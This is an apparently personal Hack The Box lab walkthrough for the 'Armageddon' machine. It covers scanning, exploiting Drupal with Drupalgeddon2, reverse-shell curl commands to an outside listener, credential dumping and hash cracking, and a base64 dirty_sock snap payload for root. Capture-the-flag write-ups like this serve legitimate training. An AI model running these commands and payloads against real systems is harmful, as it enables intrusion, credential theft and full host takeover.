@@ -1,0 +1,173 @@
+let's enumerate first:
+command: sudo rutscan -a 10.10.10.233
+result:
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+command: sudo nmap -sSVC -A -P 22,80 10.10.10.233
+result:
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 82c6bbc7026a93bb7ccbdd9c30937934 (RSA)
+|   256 3aca9530f312d7ca4505bcc7f116bbfc (ECDSA)
+|_  256 7ad4b36879cf628a7d5a61e7060f5f33 (ED25519)
+80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
+|_http-title: Welcome to  Armageddon |  Armageddon
+| http-robots.txt: 36 disallowed entries (15 shown)
+| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
+|_/LICENSE.txt /MAINTAINERS.txt
+|_http-generator: Drupal 7 (http://drupal.org)
+|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 3.18 (95%), Linux 3.2 - 4.9 (95%), Linux 3.16 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Oracle VM Server 3.4.2 (Linux 4.1) (93%), Linux 3.10 - 4.11 (93%), Linux 5.1 (93%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+
+access: http://10.10.10.233/
+access: view-source:http://10.10.10.233/
+take attention:
+<meta name="Generator" content="Drupal 7 (http://drupal.org)" />
+
+command: curl -s 10.10.10.233/CHANGELOG.txt | head
+
+Drupal 7.56, 2017-06-21
+-----------------------
+- Fixed security issues (access bypass). See SA-CORE-2017-003.
+
+Drupal 7.55, 2017-06-07
+-----------------------
+- Fixed incompatibility with PHP versions 7.0.19 and 7.1.5 due to duplicate
+  DATE_RFC7231 definition.
+- Made Drupal core pass all automated tests on PHP 7.1.
+
+command: searchsploit drupal 7
+-------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                |  Path
+-------------------------------------------------------------- ---------------------------------
+Drupal 4.1/4.2 - Cross-Site Scripting                         | php/webapps/22940.txt
+Drupal 4.5.3 < 4.6.1 - Comments PHP Injection                 | php/webapps/1088.pl
+Drupal 4.7 - 'Attachment mod_mime' Remote Command Execution   | php/webapps/1821.php
+Drupal 4.x - URL-Encoded Input HTML Injection                 | php/webapps/27020.txt
+Drupal 5.2 - PHP Zend Hash ation Vector                       | php/webapps/4510.txt
+Drupal 6.15 - Multiple Persistent Cross-Site Scripting Vulner | php/webapps/11060.txt
+Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Add Admin U | php/webapps/34992.py
+Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Admin Sessi | php/webapps/44355.php
+Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset | php/webapps/34984.py
+Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset | php/webapps/34993.php
+Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Remote Code | php/webapps/35150.php
+Drupal 7.12 - Multiple Vulnerabilities                        | php/webapps/18564.txt
+Drupal 7.x Module Services - Remote Code Execution            | php/webapps/41564.php
+Drupal < 4.7.6 - Post Comments Remote Command Execution       | php/webapps/3313.pl
+Drupal < 5.1 - Post Comments Remote Command Execution         | php/webapps/3312.pl
+Drupal < 5.22/6.16 - Multiple Vulnerabilities                 | php/webapps/33706.txt
+Drupal < 7.34 - Denial of Service                             | php/dos/35415.txt
+Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code ( | php/webapps/44557.rb
+Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code ( | php/webapps/44557.rb
+Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code E | php/webapps/44542.txt
+Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' | php/webapps/44449.rb
+Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote C | php/remote/44482.rb
+Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote C | php/remote/44482.rb
+Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote C | php/webapps/44448.py
+Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize | php/remote/46510.rb
+Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize | php/remote/46510.rb
+Drupal < 8.6.10 / < 8.5.11 - REST Module Remote Code Executio | php/webapps/46452.txt
+Drupal < 8.6.9 - REST Module Remote Code Execution            | php/webapps/46459.py
+Drupal avatar_uploader v7.x-1.0-beta8 - Arbitrary File Disclo | php/webapps/44501.txt
+Drupal avatar_uploader v7.x-1.0-beta8 - Cross Site Scripting  | php/webapps/50841.txt
+Drupal Module CKEditor < 4.1WYSIWYG (Drupal 6.x/7.x) - Persis | php/webapps/25493.txt
+Drupal Module CODER 2.5 - Remote Command Execution (Metasploi | php/webapps/40149.rb
+Drupal Module Coder < 7.x-1.3/7.x-2.6 - Remote Code Execution | php/remote/40144.php
+Drupal Module Cumulus 5.x-1.1/6.x-1.4 - 'tagcloud' Cross-Site | php/webapps/35397.txt
+Drupal Module Drag & Drop Gallery 6.x-1.5 - 'upload.php' Arbi | php/webapps/37453.php
+Drupal Module Embedded Media Field/Media 6.x : Video Flotsam/ | php/webapps/35072.txt
+Drupal Module RESTWS 7.x - PHP Remote Code Execution (Metaspl | php/remote/40130.rb
+Drupal Module Sections - Cross-Site Scripting                 | php/webapps/10485.txt
+Drupal Module Sections 5.x-1.2/6.x-1.2 - HTML Injection       | php/webapps/33410.txt
+
+clone this git repository: https://github.com/dreadlocked/Drupalgeddon2
+command: /home/donika-pentest/Downloads/Drupalgeddon2/drupalgeddon2.rb http://10.10.10.233
+we get shell
+
+take atttention:
+[i] Fake PHP shell:   curl 'http://10.10.10.233/shell.php' -d 'c=hostname'
+
+command: curl 'http://10.10.10.233/shell.php' -d 'c=id'      
+uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
+
+command: curl -G --data-urlencode "c=bash -i >& /dev/tcp/10.10.10.233/7979 0>&1" 'http://10.10.10.233/shell.php'
+
+command: nc -lvnp 4444
+command: curl -G --data-urlencode "c=bash -i >& /dev/tcp/10.10.16.19/4444 0>&1" 'http://10.10.10.233/shell.php'
+
+command: ls -l /home
+ls: cannot open directory /home: Permission denied
+
+command: cat /etc/passwd | grep sh
+root:x:0:0:root:/root:/bin/bash
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
+brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash
+
+command: cd /var/www/html/sites/default
+command: cat settings.xml
+take attention:
+$databases = array (
+  'default' => 
+  array (
+    'default' => 
+    array (
+      'database' => 'drupal',
+      'username' => 'drupaluser',
+      'password' => 'CQHEy@9M*m23gBVj',
+      'host' => 'localhost',
+      'port' => '',
+      'driver' => 'mysql',
+      'prefix' => '',
+    ),
+  ),
+);
+
+command: mysql -e 'show tables;' -u drupaluser -p'CQHEy@9M*m23gBVj' drupal
+result:
+...
+users
+users_roles
+variable
+watchdog
+
+take attention: users
+
+command: mysql -e 'select * from users;' -u drupaluser -p'CQHEy@9M*m23gBVj' drupal
+result:
+uid	name	pass	mail	theme	signature	signature_format	created	access	login	status	timezone	language	picture	init	data
+0						NULL	0	0	0	0	NULL		0		NULL
+1	brucetherealadmin	$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt	admin@armageddon.eu			filtered_html	1606998756	1607077194	1607076276	1	Europe/London		0	admin@armageddon.eu	a:1:{s:7:"overlay";i:1;}
+
+let's crack password: $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
+
+command: echo '$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt' > bruce-hash
+command: hashcat -m 7900 bruce-hash /home/donika-pentest/Documents/hackthebox/linux/26_postman_easy/rockyou.txt --show
+$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt:booboo
+
+command: ssh brucetherealadmin@10.10.10.233
+password: booboo
+
+command: python2 -c 'print "aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw" + "A"*4256 + "=="' | base64 -d > dedsec.snap
+command: sudo /usr/bin/snap install --devmode dedsec.snap
+command: su dirty_sock
+password: dirty_sock
+command: sudo -i
+Password: dirty_sock
+
+command: cat /root/root.txt
+09a417b16627115ce7410eaac5675bad
+
+resource:
+https://0xdf.gitlab.io/2021/07/24/htb-armageddon.html#shell-as-brucetherealadmin
+
+https://freakydodo.medium.com/hackthebox-armageddon-writeup-armageddon-htb-walkthro-29bffa86025d
